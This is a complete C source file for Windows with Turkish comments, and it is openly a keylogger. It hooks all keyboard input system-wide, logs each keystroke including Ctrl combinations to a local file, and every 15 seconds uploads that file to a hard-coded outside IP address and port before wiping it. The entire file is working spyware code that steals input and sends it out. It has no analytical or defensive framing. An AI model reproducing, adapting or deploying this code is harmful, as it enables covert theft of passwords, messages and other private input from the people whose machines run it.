#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "185.244.145.186"  // Server IP
#define SERVER_PORT 7979
#define BUFFER_SIZE 1024
#define INPUT_FILE "dosya.txt"
#define INTERVAL 15  // 15 saniye

HHOOK keyboardHook;
FILE *file;

// Tuş yakalama fonksiyonu 
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
   if (nCode == HC_ACTION) {
       if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
           KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
           FILE* file = fopen(INPUT_FILE, "a");
           if (file) {
               BYTE keyState[256] = {0};
               GetKeyboardState(keyState);
               WCHAR buffer[16] = {0};

               // Eğer CTRL tuşuna basılıysa, bunu da yakala
               if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                   if (ToUnicode(kbStruct->vkCode, kbStruct->scanCode, 
                   keyState, buffer, sizeof(buffer)/sizeof(WCHAR), 0) > 0) {
                       fwprintf(file, L"^%ls", buffer); // Ctrl kombinasyonlarını "Ctrl" olarak göster
                   }
               } else {
                   if (ToUnicode(kbStruct->vkCode, kbStruct->scanCode, 
                   keyState, buffer, sizeof(buffer)/sizeof(WCHAR), 0) > 0) {
                       fwprintf(file, L"%ls", buffer); // Unicode karakterleri düzgün kaydet
                   }
               }
               fclose(file);
           }
       }
   }
   return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Dosya gönderme fonksiyonu
void send_file(const char *filename, SOCKET sock) {
   FILE *file = fopen(filename, "rb");
   if (!file) {
       printf("Dosya açılamadı!\n");
       return;
   }

   char buffer[BUFFER_SIZE];
   int bytesRead;

   while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
       send(sock, buffer, bytesRead, 0);
   }

   printf("Dosya gönderildi.\n");
   fclose(file);

   // Dosyayı temizle
   file = fopen(filename, "w");
   if (file) {
       fclose(file);
   }
}

// Dosya gönderme thread'i
DWORD WINAPI SendFileThread(LPVOID lpParam) {
   while (1) {
       Sleep(INTERVAL * 1000);
       
       SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
       if (sock == INVALID_SOCKET) {
           continue;
       }

       struct sockaddr_in server;
       server.sin_addr.s_addr = inet_addr(SERVER_IP);
       server.sin_family = AF_INET;
       server.sin_port = htons(SERVER_PORT);

       if (connect(sock, (struct sockaddr*)&server, sizeof(server)) >= 0) {
           send_file(INPUT_FILE, sock);
       }
       
       closesocket(sock);
   }
   return 0;
}

int main() {
   // Winsock başlatma
   WSADATA wsa;
   if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
       return 1;
   }

   // Hook kurulumu
   keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
       GetModuleHandle(NULL), 0);
   if (!keyboardHook) {
       WSACleanup();
       return 1;
   }

   printf("Keylogger başlatıldı. 15 saniyede bir veriler gönderilecek...\n");

   // Dosya gönderme thread'ini başlat
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendFileThread, NULL, 0, NULL);

   // Mesaj döngüsü 
   MSG msg;
   while (GetMessage(&msg, NULL, 0, 0)) {
       TranslateMessage(&msg);
       DispatchMessage(&msg);
   }

   UnhookWindowsHookEx(keyboardHook);
   WSACleanup();
   return 0;
}
